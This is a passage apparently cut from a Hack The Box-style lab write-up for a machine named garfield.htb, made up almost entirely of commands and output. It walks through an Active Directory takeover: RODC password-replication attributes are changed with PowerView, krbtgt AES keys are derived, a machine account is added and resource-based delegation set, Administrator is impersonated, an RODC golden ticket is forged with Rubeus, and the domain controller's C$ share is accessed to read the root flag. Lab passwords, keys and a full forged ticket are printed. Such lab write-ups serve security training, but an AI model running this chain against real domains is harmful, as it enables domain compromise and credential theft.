zs1n@ptw ~> python3 powerview.py "garfield.htb"/"l.wilson_adm":'Password123!'@"DC01.garfield.htb"
Logging directory is set to /home/zsln/.powerview/logs/garfield
╭─LDAP─[DC01.garfield.htb]─[GARFIELD\l.wilson_adm]-[NS:<auto>]
╰─ ❯ Set-DomainObject -Identity RODC01$ -Set msDS-RevealOnDemandGroup='CN=Administrator,CN=Users,DC=garfield,DC=htb'
[2026-04-06 23:44:41] [Set-DomainObject] Success! modified attribute msDS-RevealOnDemandGroup for CN=RODC01,OU=Domain Controllers,DC=garfield,DC=htb
╭─LDAP─[DC01.garfield.htb]─[GARFIELD\l.wilson_adm]-[NS:<auto>]
╰─ ❯ Set-DomainObject -Identity RODC-server$ -Append msDS-RevealOnDemandGroup='CN=Allowed RODC Password Replication Group,CN=Users,DC=garfield,DC=htb'
[2026-04-06 23:44:48] [Set-DomainObject] Identity RODC-server$ not found in domain
╭─LDAP─[DC01.garfield.htb]─[GARFIELD\l.wilson_adm]-[NS:<auto>]
╰─ ❯ Set-DomainObject -Identity RODC01$ -Append msDS-RevealOnDemandGroup='CN=Allowed RODC Password Replication Group,CN=Users,DC=garfield,DC=htb'
[2026-04-06 23:44:56] [Set-DomainObject] Success! modified attribute msDS-RevealOnDemandGroup for CN=RODC01,OU=Domain Controllers,DC=garfield,DC=htb
╭─LDAP─[DC01.garfield.htb]─[GARFIELD\l.wilson_adm]-[NS:<auto>]

Set-DomainObject -Identity RODC01$ -Clear msDS-NeverRevealGroup
[2026-04-06 23:46:48] [Set-DomainObject] Success! modified attribute msDS-NeverRevealGroup for CN=RODC01,OU=Domain Controllers,DC=garfield,DC=htb


```

https://github.com/Tw1sm/aesKrbKeyGen

```bash
zs1n@ptw ~> python3 aesKrbKeyGen.py -domain garfield.htb -user krbtgt_8245 -pass 'Password123!'
[*] Salt: GARFIELD.HTBkrbtgt_8245

[+] AES256 Key: B9063CC83511B8DFE04BB5FF0272A6609AFECFF4C920F4D9B19506048E57497A
[+] AES128 Key: 888600F335A4D2A36CC7BC12E9B3B3A2
```

```bash
zs1n@ptw ~> impacket-lookupsid garfield.htb/l.wilson_adm:'Password123!'@dc01.garfield.htb
Impacket v0.14.0.dev0+20260219.104542.8728bbcf - Copyright Fortra, LLC and its affiliated companies

[*] Brute forcing SIDs at dc01.garfield.htb
[*] StringBinding ncacn_np:dc01.garfield.htb[\pipe\lsarpc]
[*] Domain SID is: S-1-5-21-2502726253-3859040611-225969357
```

```bash
zs1n@ptw ~> impacket-addcomputer garfield.htb/l.wilson_adm:'Password123!' -computer-name 'zsln$' -computer-pass 'FakePass123!' -dc-ip 10.129.24.143
Impacket v0.14.0.dev0+20260219.104542.8728bbcf - Copyright Fortra, LLC and its affiliated companies

[*] Successfully added machine account zsln$ with password FakePass123!.
```

```powershell
*Evil-WinRM* PS C:\Users\l.wilson_adm\Documents> Set-ADComputer RODC01 -PrincipalsAllowedToDelegateToAccount zsln$
```

```bash
zs1n@ptw ~> getST.py -spn 'cifs/RODC01.garfield.htb' -impersonate Administrator -dc-ip 10.129.24.143 'garfield.htb/zsln$:FakePass123!'
Impacket v0.14.0.dev0+20260219.104542.8728bbcf - Copyright Fortra, LLC and its affiliated companies

[-] CCache file is not found. Skipping...
[*] Getting TGT for user
[*] Impersonating Administrator
[*] Requesting S4U2self
[*] Requesting S4U2Proxy
[*] Saving ticket in Administrator@cifs_RODC01.garfield.htb@GARFIELD.HTB.ccache
```

```bash
1. .\Rubeus.exe golden /rodcNumber:8245 /aes256:d6c93cbe006372adb8403630f9e86594f52c8105a52f9b21fef62e9c7a75e240 /user:Administrator /id:500 /domain:garfield.htb /sid:S-1-5-21-2502726253-3859040611-225969357 /nowrap
```

```bash

```

```bash
*Evil-WinRM* PS C:\programdata> .\Rubeus.exe golden /rodcNumber:8245 /aes256:d6c93cbe006372adb8403630f9e86594f52c8105a52f9b21fef62e9c7a75e240 /user:Administrator /id:500 /domain:garfield.htb /sid:S-1-5-21-2502726253-3859040611-225969357 /nowrap

   ______        _
  (_____ \      | |
   _____) )_   _| |__  _____ _   _  ___
  |  __  /| | | |  _ \| ___ | | | |/___)
  | |  \ \| |_| | |_) ) ____| |_| |___ |
  |_|   |_|____/|____/|_____)____/(___/

  v2.3.3

[*] Action: Build TGT

[*] Building PAC

[*] Domain         : GARFIELD.HTB (GARFIELD)
[*] SID            : S-1-5-21-2502726253-3859040611-225969357
[*] UserId         : 500
[*] Groups         : 520,512,513,519,518
[*] ServiceKey     : D6C93CBE006372ADB8403630F9E86594F52C8105A52F9B21FEF62E9C7A75E240
[*] ServiceKeyType : KERB_CHECKSUM_HMAC_SHA1_96_AES256
[*] KDCKey         : D6C93CBE006372ADB8403630F9E86594F52C8105A52F9B21FEF62E9C7A75E240
[*] KDCKeyType     : KERB_CHECKSUM_HMAC_SHA1_96_AES256
[*] Service        : krbtgt
[*] Target         : garfield.htb

[*] Generating EncTicketPart
[*] Signing PAC
[*] Encrypting EncTicketPart
[*] Generating Ticket
[*] Generated KERB-CRED
[*] Forged a TGT for 'Administrator@garfield.htb'

[*] AuthTime       : 4/6/2026 8:05:16 PM
[*] StartTime      : 4/6/2026 8:05:16 PM
[*] EndTime        : 4/7/2026 6:05:16 AM
[*] RenewTill      : 4/13/2026 8:05:16 PM

[*] base64(ticket.kirbi):

      doIFkjCCBY6gAwIBBaEDAgEWooIEfzCCBHthggR3MIIEc6ADAgEFoQ4bDEdBUkZJRUxELkhUQqIhMB+gAwIBAqEYMBYbBmtyYnRndBsMZ2FyZmllbGQuaHRio4IENzCCBDOgAwIBEqEGAgQgNQAAooIEIgSCBB4uK57yZx6hIJVCO7VsrmTGQzofniSlyAtW7xbvTQHsdF0FrdwyM9Ry0OBrdpcxYtIUfOhlG4fMKj9EPT4ePUvP1Gvqwu6kvRcft4bW44QkjOqjlWnua8pNvzio2/0w5dnrnb15fhJbit9WiOAuexGEjeHcHtGpcsHkrDdNAYRuhm3WMJOLMc6Vd70rsCYDo1KLVzdMI9I2szJrIUi520F18BH4dbi4W5vZVLC6tC1DPqluyOPMTIfMchd38ca8iN1sx61xGD+pny0O1bwqps+hnv6vQBNk0xKnlIScVp2t7ABLX7o2XvISF8x9yLIS/+vxvoztDC5Vh0/BBe3pqNTaiTZPiUYXWxoAgCNxsa0i6xys0rtyWgwkxT4TKTcEkEtcvbsxKsREDLjVlHGrDvJo8CYpSZT829cSFrhs9/5uPr25L3vfI2hokeRzfnfkdiiin7bWiT7ISSp1Ca/k9xRcAjLheFTtgAx3gWjEO00TTa93V7t1x3GJFxgRZngy7QxqXGt57XCRMh6xLnhkG+ZJ+xmitw01ytvaU2gMN09YKwzInvR11+B9DAYfWU9tNwwJffmurW/m5/KG51tlgHhHwepVk+p9wJBMSLjg2BWVQcDQkB/4P4Z5GMj0S9dC2ksZ3Hzci1GCsKmaq2Y705zggDu10nj0yD5kmH2nClc7FzK7ZNnc6ryUuV7F9GBcbH/HxAxbhySc7HXmmWW36v2ll+/qymE3RtlvbnRWYNrPzeIkIbxzdu8YnkaoHZQ5sSf4y+cQNzXnIfctug8HAr9wd2MSN7ox1zhQlVdXhRU/4+f41Ld2EyjNpFyg74DQGhxTqnv+EAu5I8WaLmETXFnV2xDdYOVkTorx/+r25Eviete5iyOPPMf9YYhWmAopEsIVRrDZLvOunLdjjVnFdhf/Q49arswu942+53RFi0DCByoRb3yDHih9e5GC5J58wvlkUKTKZodH4x+nF+VROy7NZEdFM8yW4AWwiR1BfZmM5F7Qu88lXJPbZTrUTNM+6S1M0J4yVP/N+nGn5MieIN22fu/d+j3U+NCw0xGXKP4twqvJsVVe1iIVow43Xcf0fTeNSh41NiunCV5qDFKZWhrRhJl1jX7WvFaiQXHQ8u710OzstpawquWzQZU1P7x5bibSwtTIktqohuKvN95WPgxSMa/kPJpAawIdv/T9XgEr95QwrLCbePjgz40EVxpNa3u5KvCrCqowsZfKPlFe6z9sRdxBZQk+z+DAkN7nvEzN7lhI4kFA3MeGRiYkl7c0wiBnajdiWXSIpHwD1ZYpZPs81nprZRPHoDCa4RsyiZVFIaqfBSVyN4OZpMXEvDe2UX2diOQQ9Otm+szMcY8lXCeI7v/gyYWfH+gtxL2ka2b2SwGCiQGirpQz0R0oXLRio4H+MIH7oAMCAQCigfMEgfB9ge0wgeqggecwgeQwgeGgKzApoAMCARKhIgQgX7MRGzCpdVu0Nso5w0AH6BVCoR8/5zqLi3pM1j9XP52hDhsMR0FSRklFTEQuSFRCohowGKADAgEBoREwDxsNQWRtaW5pc3RyYXRvcqMHAwUAQOAAAKQRGA8yMDI2MDQwNzAzMDUxNlqlERgPMjAyNjA0MDcwMzA1MTZaphEYDzIwMjYwNDA3MTMwNTE2WqcRGA8yMDI2MDQxNDAzMDUxNlqoDhsMR0FSRklFTEQuSFRCqSEwH6ADAgECoRgwFhsGa3JidGd0GwxnYXJmaWVsZC5odGI=
```

```bash
zs1n@ptw ~> cat ticket.base64 | base64 -d > ticket.kirbi

zs1n@ptw ~> cat ticket.base64 | base64 -d > ticket.kirbi
zs1n@ptw ~> impacket-ticketConverter ticket.kirbi administrator.ccache
Impacket v0.14.0.dev0+20260219.104542.8728bbcf - Copyright Fortra, LLC and its affiliated companies

[*] converting kirbi to ccache...
[+] done
```

```bash
zs1n@ptw ~> impacket-smbclient -k -no-pass DC01.garfield.htb
Impacket v0.14.0.dev0+20260219.104542.8728bbcf - Copyright Fortra, LLC and its affiliated companies

Type help for list of commands
# use C$
# ls
drw-rw-rw-          0  Wed Aug 13 16:49:21 2025 $Recycle.Bin
drw-rw-rw-          0  Wed Aug 13 15:50:32 2025 Documents and Settings
drw-rw-rw-          0  Tue Jan 13 10:08:54 2026 inetpub
-rw-rw-rw-  738197504  Mon Apr  6 16:00:35 2026 pagefile.sys
drw-rw-rw-          0  Wed Aug 13 16:49:21 2025 PerfLogs
drw-rw-rw-          0  Wed Aug 13 07:00:55 2025 Program Files
drw-rw-rw-          0  Sun Aug 17 10:05:09 2025 Program Files (x86)
drw-rw-rw-          0  Mon Apr  6 23:46:05 2026 ProgramData
drw-rw-rw-          0  Wed Aug 13 15:50:33 2025 Recovery
drw-rw-rw-          0  Wed Aug 13 07:01:11 2025 System Volume Information
drw-rw-rw-          0  Tue Jan 27 19:40:54 2026 Users
drw-rw-rw-          0  Wed Apr  1 14:27:12 2026 Windows
# cd users\administrator\desktop
# ls
drw-rw-rw-          0  Sat Mar 14 03:14:36 2026 .
drw-rw-rw-          0  Sat Mar 14 03:14:36 2026 ..
-rw-rw-rw-        282  Sat Mar 14 03:14:36 2026 desktop.ini
-rw-rw-rw-         34  Mon Apr  6 16:01:51 2026 root.txt
# get root.txt
```

```bash
zs1n@ptw ~> cat root.txt
45eb518ad9d05b69a44889465ee6381a
```

```bash

```